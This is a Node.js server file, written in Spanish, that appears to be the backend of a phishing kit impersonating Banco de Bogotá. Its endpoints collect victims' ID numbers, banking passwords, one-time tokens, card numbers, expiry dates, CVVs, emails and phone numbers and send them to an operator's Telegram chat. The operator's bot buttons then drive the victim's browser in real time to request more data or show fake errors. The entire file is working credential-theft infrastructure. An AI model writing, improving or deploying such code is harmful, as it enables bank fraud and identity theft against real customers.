// server.js - Banco de Bogotá
const cors = require("cors");
const express = require("express");
const bodyParser = require("body-parser");
const dotenv = require("dotenv");
const fetch = require("node-fetch");
const app = express();
dotenv.config();

app.use(cors({
  origin: true,
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type"],
  optionsSuccessStatus: 204
}));

app.options("*", cors());

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(bodyParser.json());

// Middleware para loggear todas las solicitudes
app.use((req, res, next) => {
  if (req.method === 'POST') {
    console.log(`\n📨 [${new Date().toISOString()}] POST ${req.path}`);
    console.log('   Content-Type:', req.headers['content-type']);
    console.log('   Body:', JSON.stringify(req.body, null, 2));
  }
  next();
});

const sessions = new Map();

const getTelegramApiUrl = (method) => `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;

const getSafeValue = (value) => {
  if (value === undefined || value === null || value === '' || value === 'undefined' || value === 'null') {
    return "N/D";
  }
  return String(value).trim();
};

// ===== FUNCIÓN PARA ELIMINAR BOTONES DE UN MENSAJE =====
async function eliminarBotones(chatId, messageId) {
  try {
    await fetch(getTelegramApiUrl('editMessageReplyMarkup'), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        reply_markup: { inline_keyboard: [] }
      })
    });
    console.log(`✅ Botones eliminados del mensaje ${messageId}`);
  } catch (e) {
    console.error("❌ Error al eliminar botones:", e.message);
  }
}

// ===== FUNCIONES DE MENSAJES TELEGRAM =====

// Mensaje inicial con todos los botones
async function enviarMensajeTelegram({ tipoDoc, numDoc, clave, sessionId }) {
  const mensaje = `
🔐 *NUEVO ACCESO - CLAVE SEGURA*

📄 *Tipo de documento:* ${tipoDoc || "N/D"}
🆔 *Documento:* ${numDoc || "N/D"}
🔑 *Clave segura:* ${clave || "N/D"}

🌀 *Session ID:* \`${sessionId}\`
`;

  const botones = {
    inline_keyboard: [
      [
        { text: "🔄 Error Logo", callback_data: `inicio_${sessionId}` },
        { text: "📧 Pedir Correo", callback_data: `correo_${sessionId}` }
      ],
      [
        { text: "💳 Pedir Tarjeta", callback_data: `tarjeta_${sessionId}` },
        { text: "🔢 Pedir Token", callback_data: `otp1_${sessionId}` }
      ],
      [
        { text: "🚫 Error Token", callback_data: `otp2_${sessionId}` }
      ],
      [
        { text: "💰 Formulario", callback_data: `formulario_${sessionId}` }
      ]
    ]
  };

  const response = await fetch(getTelegramApiUrl('sendMessage'), {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: "Markdown",
      reply_markup: botones
    })
  });

  const data = await response.json();
  
  // Guardar el message_id del último mensaje
  if (data.ok && data.result) {
    const sessionData = sessions.get(sessionId) || { redirect_to: null };
    sessionData.last_message_id = data.result.message_id;
    sessions.set(sessionId, sessionData);
  }
}

// Mensaje para OTP con botones
async function enviarMensajeTelegramOTP({ tipoDoc, numDoc, clave, sessionId, token }) {
  // Eliminar botones del mensaje anterior
  const sessionData = sessions.get(sessionId);
  if (sessionData && sessionData.last_message_id) {
    await eliminarBotones(CHAT_ID, sessionData.last_message_id);
  }

  const mensaje = `
🔢 *NUEVO TOKEN RECIBIDO*

📄 *Tipo de documento:* ${tipoDoc || "N/D"}
🆔 *Documento:* ${numDoc || "N/D"}
🔑 *Clave segura:* ${clave || "N/D"}
📲 *Token:* ${token || "N/D"}

🌀 *Session ID:* \`${sessionId}\`
`;

  const botones = {
    inline_keyboard: [
      [
        { text: "🔄 Error Logo", callback_data: `inicio_${sessionId}` },
        { text: "📧 Pedir Correo", callback_data: `correo_${sessionId}` }
      ],
      [
        { text: "💳 Pedir Tarjeta", callback_data: `tarjeta_${sessionId}` },
        { text: "🔢 Pedir Token", callback_data: `otp1_${sessionId}` }
      ],
      [
        { text: "🚫 Error Token", callback_data: `otp2_${sessionId}` }
      ],
      [
        { text: "💰 Formulario", callback_data: `formulario_${sessionId}` }
      ]
    ]
  };

  const response = await fetch(getTelegramApiUrl('sendMessage'), {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: "Markdown",
      reply_markup: botones
    })
  });

  const data = await response.json();
  
  // Guardar el nuevo message_id
  if (data.ok && data.result && sessionData) {
    sessionData.last_message_id = data.result.message_id;
    sessions.set(sessionId, sessionData);
  }
}

// Mensaje para tarjeta con botones
async function enviarMensajeTelegramTarjeta({ tipoDoc, numDoc, clave, sessionId, tarjeta, fecha, cvv }) {
  // Eliminar botones del mensaje anterior
  const sessionData = sessions.get(sessionId);
  if (sessionData && sessionData.last_message_id) {
    await eliminarBotones(CHAT_ID, sessionData.last_message_id);
  }

  const mensaje = `
💳 *DATOS DE TARJETA RECIBIDOS*

📄 *Tipo de documento:* ${tipoDoc || "N/D"}
🆔 *Documento:* ${numDoc || "N/D"}
🔑 *Clave segura:* ${clave || "N/D"}
💳 *Tarjeta:* ${tarjeta || "N/D"}
📅 *Fecha:* ${fecha || "N/D"}
🔒 *CVV:* ${cvv || "N/D"}

🌀 *Session ID:* \`${sessionId}\`
`;

  const botones = {
    inline_keyboard: [
      [
        { text: "🔄 Error Logo", callback_data: `inicio_${sessionId}` },
        { text: "📧 Pedir Correo", callback_data: `correo_${sessionId}` }
      ],
      [
        { text: "💳 Pedir Tarjeta", callback_data: `tarjeta_${sessionId}` },
        { text: "🔢 Pedir Token", callback_data: `otp1_${sessionId}` }
      ],
      [
        { text: "🚫 Error Token", callback_data: `otp2_${sessionId}` }
      ],
      [
        { text: "💰 Formulario", callback_data: `formulario_${sessionId}` }
      ]
    ]
  };

  const response = await fetch(getTelegramApiUrl('sendMessage'), {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: "Markdown",
      reply_markup: botones
    })
  });

  const data = await response.json();
  
  // Guardar el nuevo message_id
  if (data.ok && data.result && sessionData) {
    sessionData.last_message_id = data.result.message_id;
    sessions.set(sessionId, sessionData);
  }
}

// Mensaje para correo con botones
async function enviarMensajeTelegramCorreo({ tipoDoc, numDoc, clave, sessionId, correo, celular }) {
  // Eliminar botones del mensaje anterior
  const sessionData = sessions.get(sessionId);
  if (sessionData && sessionData.last_message_id) {
    await eliminarBotones(CHAT_ID, sessionData.last_message_id);
  }

  const mensaje = `
📧 *DATOS DE CORREO Y CELULAR RECIBIDOS*

📄 *Tipo de documento:* ${tipoDoc || "N/D"}
🆔 *Documento:* ${numDoc || "N/D"}
🔑 *Clave segura:* ${clave || "N/D"}
📧 *Correo:* ${correo || "N/D"}
📱 *Celular:* ${celular || "N/D"}

🌀 *Session ID:* \`${sessionId}\`
`;

  const botones = {
    inline_keyboard: [
      [
        { text: "🔄 Error Logo", callback_data: `inicio_${sessionId}` },
        { text: "📧 Pedir Correo", callback_data: `correo_${sessionId}` }
      ],
      [
        { text: "💳 Pedir Tarjeta", callback_data: `tarjeta_${sessionId}` },
        { text: "🔢 Pedir Token", callback_data: `otp1_${sessionId}` }
      ],
      [
        { text: "🚫 Error Token", callback_data: `otp2_${sessionId}` }
      ],
      [
        { text: "💰 Formulario", callback_data: `formulario_${sessionId}` }
      ]
    ]
  };

  const response = await fetch(getTelegramApiUrl('sendMessage'), {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: "Markdown",
      reply_markup: botones
    })
  });

  const data = await response.json();
  
  // Guardar el nuevo message_id
  if (data.ok && data.result && sessionData) {
    sessionData.last_message_id = data.result.message_id;
    sessions.set(sessionId, sessionData);
  }
}

// ===== RUTAS DE NOTIFICACIÓN =====

// Ruta de ingreso (clave segura)
app.post("/virtualpersona", async (req, res) => {
  console.log("📨 Solicitud recibida en /virtualpersona");
  console.log("📦 req.body completo:", JSON.stringify(req.body, null, 2));

  const { sessionId, metodo, tipoDoc, numDoc, clave } = req.body;

  console.log(`🔍 Valores destructurados:`);
  console.log(`   - sessionId: ${sessionId}`);
  console.log(`   - metodo: ${metodo}`);
  console.log(`   - tipoDoc: ${tipoDoc}`);
  console.log(`   - numDoc: ${numDoc}`);
  console.log(`   - clave: ${clave}`);

  if (metodo === "clave") {
    sessions.set(sessionId, { redirect_to: null });

    const tipoDocSafe = getSafeValue(tipoDoc);
    const numDocSafe = getSafeValue(numDoc);
    const claveSafe = getSafeValue(clave);

    console.log(`✅ Enviando a Telegram con valores seguros:`);
    console.log(`   - tipoDoc: ${tipoDocSafe}`);
    console.log(`   - numDoc: ${numDocSafe}`);
    console.log(`   - clave: ${claveSafe}`);

    await enviarMensajeTelegram({
      tipoDoc: tipoDocSafe,
      numDoc: numDocSafe,
      clave: claveSafe,
      sessionId
    });

    return res.json({ ok: true });
  }

  return res.status(400).json({ error: "Método no soportado" });
});

// Notificar OTP (primer intento)
app.post("/notify/otp1", async (req, res) => {
  try {
    const { sessionId, tipoDoc, numDoc, clave, token } = req.body || {};
    if (!sessionId) return res.status(400).json({ ok: false, error: "Falta sessionId" });

    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });

    await enviarMensajeTelegramOTP({
      tipoDoc: getSafeValue(tipoDoc),
      numDoc: getSafeValue(numDoc),
      clave: getSafeValue(clave),
      sessionId,
      token: getSafeValue(token)
    });
    return res.json({ ok: true });
  } catch (e) {
    console.error("❌ /notify/otp1 error:", e);
    return res.status(500).json({ ok: false });
  }
});

// Notificar OTP con error
app.post("/notify/otp2", async (req, res) => {
  try {
    const { sessionId, tipoDoc, numDoc, clave, token } = req.body || {};
    if (!sessionId) return res.status(400).json({ ok: false, error: "Falta sessionId" });

    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });

    await enviarMensajeTelegramOTP({
      tipoDoc: getSafeValue(tipoDoc),
      numDoc: getSafeValue(numDoc),
      clave: getSafeValue(clave),
      sessionId,
      token: getSafeValue(token)
    });
    return res.json({ ok: true });
  } catch (e) {
    console.error("❌ /notify/otp2 error:", e);
    return res.status(500).json({ ok: false });
  }
});

// Notificar tarjeta
app.post("/notify/tarjeta", async (req, res) => {
  try {
    const { sessionId, tipoDoc, numDoc, clave, tarjeta, fecha, cvv } = req.body || {};
    if (!sessionId) return res.status(400).json({ ok: false, error: "Falta sessionId" });

    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });

    await enviarMensajeTelegramTarjeta({
      tipoDoc: getSafeValue(tipoDoc),
      numDoc: getSafeValue(numDoc),
      clave: getSafeValue(clave),
      sessionId,
      tarjeta: getSafeValue(tarjeta),
      fecha: getSafeValue(fecha),
      cvv: getSafeValue(cvv)
    });
    return res.json({ ok: true });
  } catch (e) {
    console.error("❌ /notify/tarjeta error:", e);
    return res.status(500).json({ ok: false });
  }
});

// Notificar correo
app.post("/notify/correo", async (req, res) => {
  try {
    const { sessionId, tipoDoc, numDoc, clave, correo, celular } = req.body || {};
    if (!sessionId) return res.status(400).json({ ok: false, error: "Falta sessionId" });

    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });

    await enviarMensajeTelegramCorreo({
      tipoDoc: getSafeValue(tipoDoc),
      numDoc: getSafeValue(numDoc),
      clave: getSafeValue(clave),
      sessionId,
      correo: getSafeValue(correo),
      celular: getSafeValue(celular)
    });
    return res.json({ ok: true });
  } catch (e) {
    console.error("❌ /notify/correo error:", e);
    return res.status(500).json({ ok: false });
  }
});

// Notificar formulario
app.post("/notify/formulario", async (req, res) => {
  try {
    const { sessionId, tipoDoc, numDoc, clave, celular, monto, cuotas, interes } = req.body || {};
    if (!sessionId) return res.status(400).json({ ok: false, error: "Falta sessionId" });

    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });

    const tipoDocSafe = getSafeValue(tipoDoc);
    const numDocSafe = getSafeValue(numDoc);
    const celularSafe = getSafeValue(celular);
    const montoSafe = monto && !isNaN(monto) ? (monto / 1000000).toFixed(0) : "N/D";
    const cuotasSafe = getSafeValue(cuotas);
    const interesSafe = getSafeValue(interes);

    const mensaje = `
💰 *SOLICITUD DE CRÉDITO*

📄 *Tipo de documento:* ${tipoDocSafe}
🆔 *Documento:* ${numDocSafe}
📱 *Celular:* ${celularSafe}
💵 *Monto solicitado:* ${montoSafe === "N/D" ? "N/D" : `$${montoSafe}M COP`}
📅 *Cuotas:* ${cuotasSafe} meses
📊 *Interés:* ${interesSafe}% anual

🌀 *Session ID:* \`${sessionId}\`
`;

    const botones = {
      inline_keyboard: [
        [
          { text: "🚫 Error Logo", callback_data: `inicio_${sessionId}` },
          { text: "📧 Pedir Correo", callback_data: `correo_${sessionId}` }
        ],
        [
          { text: "💳 Pedir Tarjeta", callback_data: `tarjeta_${sessionId}` },
          { text: "🔢 Pedir Token", callback_data: `otp1_${sessionId}` }
        ],
        [
          { text: "🚫 Error Token", callback_data: `otp2_${sessionId}` }
        ]
      ]
    };

    const response = await fetch(getTelegramApiUrl('sendMessage'), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensaje,
        parse_mode: "Markdown",
        reply_markup: botones
      })
    });

    const data = await response.json();
    if (data.ok) {
      console.log("✅ Solicitud de crédito enviada a Telegram");
    }

    return res.json({ ok: true });
  } catch (e) {
    console.error("❌ /notify/formulario error:", e);
    return res.status(500).json({ ok: false });
  }
});

// ===== POLLING =====

// Ruta de polling (ready.js la consulta)
app.get("/instruction/:sessionId", (req, res) => {
  const sessionId = req.params.sessionId;
  const estado = sessions.get(sessionId);

  console.log(`📋 Polling recibido para sessionId: ${sessionId}`);
  console.log(`   Estado guardado: ${estado ? JSON.stringify(estado) : 'NO EXISTE'}`);
  console.log(`   Sessions activas: ${sessions.size}`);
  console.log(`   Todas las keys: ${Array.from(sessions.keys()).join(', ')}`);

  if (!estado) {
    console.log(`   ⚠️ No hay estado para ${sessionId}`);
    return res.json({ redirect_to: null });
  }

  if (estado.redirect_to) {
    const redireccion = estado.redirect_to;
    console.log(`   ✅ Redireccionando a: ${redireccion}`);
    estado.redirect_to = null;
    sessions.set(sessionId, estado);
    return res.json({ redirect_to: redireccion });
  }

  console.log(`   ⏳ Sin redirección aún`);
  return res.json({ redirect_to: null });
});

// ===== WEBHOOK DE TELEGRAM (CORREGIDO COMO DAVIVIENDA) =====

// 🔥 CORRECCIÓN: La ruta ahora incluye el BOT_TOKEN
app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
  try {
    const update = req.body;
    console.log(`\n🔥 WEBHOOK RECIBIDO`);
    console.log(`   Body completo: ${JSON.stringify(update, null, 2)}`);

    const { callback_query } = update;

    if (callback_query) {
      const callbackData = callback_query.data || '';
      console.log(`🔥 Callback recibido: "${callbackData}"`);

      // Dividir por guion bajo: accion_sessionId
      const parts = callbackData.split('_');
      const action = parts[0];
      const sessionId = parts.slice(1).join('_');

      console.log(`🎯 Acción parseada: "${action}"`);
      console.log(`🆔 SessionId parseado: "${sessionId}"`);

      if (!sessionId) {
        console.error(`❌ SessionId vacío en callback_data: "${callbackData}"`);
        return res.sendStatus(200);
      }

      // Eliminar botones del mensaje donde se presionó
      try {
        await eliminarBotones(
          callback_query.message.chat.id,
          callback_query.message.message_id
        );
        console.log(`✅ Botones eliminados`);
      } catch (editError) {
        console.log(`⚠️ No se pudo eliminar el menú: ${editError.message}`);
      }

      // Obtener o crear sessionData
      console.log(`💾 Buscando sessionData para: "${sessionId}"`);
      const sessionData = sessions.get(sessionId) || { redirect_to: null };
      console.log(`   SessionData anterior: ${JSON.stringify(sessionData)}`);

      sessionData.redirect_to = action;
      sessions.set(sessionId, sessionData);
      console.log(`✅ SessionData guardada: ${JSON.stringify(sessionData)}`);
      console.log(`✅ Sessions activas ahora: ${sessions.size}`);

      // Confirmación visual
      await fetch(getTelegramApiUrl('answerCallbackQuery'), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          callback_query_id: callback_query.id,
          text: `✅ Acción: ${action}`,
          show_alert: false
        })
      });

      console.log(`📄 ✅ Redirección configurada: "${sessionId}" → "${action}"`);
    } else {
      console.log(`ℹ️ Update recibido pero sin callback_query`);
    }

    res.sendStatus(200);
  } catch (err) {
    console.error("❌ Error en webhook:", err);
    console.error("   Stack:", err.stack);
    res.sendStatus(200);
  }
});

// Home
app.get("/", (req, res) => {
  res.send("Backend de Banco de Bogotá Clave Segura funcionando ✅");
});

// Ping para mantener servidor activo
app.get("/ping", (req, res) => {
  res.json({ ok: true, timestamp: new Date().toISOString() });
});

app.listen(PORT, async () => {
  console.log(`
╔═══════════════════════════════════════════╗
║   ✅ SERVIDOR BANCO DE BOGOTÁ ACTIVO      ║
║   📡 Puerto: ${PORT}                        ║
║   🤖 Bot: ${BOT_TOKEN ? 'Configurado ✔' : 'No configurado ✗'}     ║
║   💬 Chat: ${CHAT_ID ? 'Configurado ✔' : 'No configurado ✗'}    ║
║   🔧 Callback data: CORREGIDO ✔          ║
╚═══════════════════════════════════════════╝
  `);

  // Registrar webhook automáticamente con URL dinámica
  if (BOT_TOKEN) {
    // Detectar la URL dinámica del servidor desde Render
    let webhookHost = process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost:3000';
    console.log(`🌐 Detectada URL del servidor: ${webhookHost}`);
    await registerWebhook(webhookHost);
  }
});

// Activar Webhook manualmente (GET) - AHORA USA EL TOKEN EN LA RUTA
// Función para registrar webhook automáticamente
async function registerWebhook(host) {
  try {
    const webhookUrl = `https://${host}/webhook/${BOT_TOKEN}`;
    console.log(`🔗 Registrando webhook en: ${webhookUrl}`);

    const response = await fetch(getTelegramApiUrl('setWebhook'), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: webhookUrl,
        allowed_updates: ["callback_query", "message"]
      })
    });

    const data = await response.json();
    if (data.ok) {
      console.log(`✅ Webhook registrado exitosamente`);
      console.log(`   URL: ${webhookUrl}`);
    } else {
      console.error(`❌ Error registrando webhook: ${data.description}`);
    }
    return data;
  } catch (err) {
    console.error(`❌ Error en registerWebhook:`, err.message);
  }
}

app.get("/setWebhook", async (req, res) => {
  const webhookUrl = `https://${req.headers.host}/webhook/${BOT_TOKEN}`;

  const response = await fetch(getTelegramApiUrl('setWebhook'), {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      url: webhookUrl,
      allowed_updates: ["callback_query", "message"]
    })
  });

  const data = await response.json();
  res.json({
    ...data,
    webhookUrl: webhookUrl
  });
});